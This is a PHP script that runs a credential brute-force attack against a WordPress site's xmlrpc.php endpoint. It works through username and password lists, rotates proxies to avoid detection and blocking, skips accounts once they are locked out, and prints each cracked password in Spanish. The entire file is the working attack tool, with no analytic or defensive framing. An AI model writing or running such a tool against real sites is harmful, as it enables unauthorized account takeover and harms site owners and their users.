<?php
require 'vendor/autoload.php';

$domain = 'http://example.com';
$endpoint = $domain . "/xmlrpc.php";

$users_file = 'users.txt';
$passwords_file = 'passwords.txt';
$proxys_file = 'proxys.txt';

$users = file($users_file);
$passwords = file($passwords_file);
$proxys = file($proxys_file);

echo "\nUsers file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";

function has($string, $value) {
  return strpos($string,$value) !== false;
}

function is_login_error($e) {
  $msg = $e->getMessage();
  if (has($msg, 'Usuario') && has($msg, 'incorrecta'))
    return true;

  if ( has($msg, 'Nome') && has($msg, 'senha') )
    return true;

  return false;
}

function is_proxy_error($e) {
  $msg = $e->getMessage();

  if ( has($msg,'Connection timed out') ) 
    return true;

  return false;
}

function is_user_error($e) {
  $msg = $e->getMessage();
 
  if (has($msg, 'You have been locked out due to too many invalid login attempts.'))
    return true;

  return false;
}

function remove_proxy($proxy) {
  $i = array_search(implode(':',$proxy),$proxys);
  unset($proxys[$i]);
}

$i = 0;
foreach ( $users as $user ) {
  foreach ( $passwords as $pass ) {
    $pass = trim($pass);
    $user = trim($user);
    # Create client instance
    $wpClient = new \HieuLe\WordpressXmlrpcClient\WordpressClient($endpoint, $user, $pass);

    $p = $i % count($proxys);
    $i++;
    $proxy = explode(':',trim($proxys[$p]));
    $proxy = array('proxy_ip'=>$proxy[0], 'proxy_port'=>$proxy[1]);
    $wpClient->setProxy($proxy);

    try {
      $a = $wpClient->getProfile();

      echo "El password de '$user' es '$pass'\n";
    
    } catch ( Exception $e ) {
      if ( is_login_error($e) ) {
        echo '.';

      } elseif ( is_proxy_error($e) ) {
        echo "Quitando proxy {$proxy['proxy_ip']}:{$proxy['proxy_port']}\n";
        remove_proxy($proxy);
      } elseif (is_user_error($e)) {
        echo "Salteando usuario $user por errores\n";
        continue 2;
      } else {
        echo "\nProxy: {$proxy['proxy_ip']}\n";
        echo $e->getMessage() . "\n\n";
      }
    }
  }
}
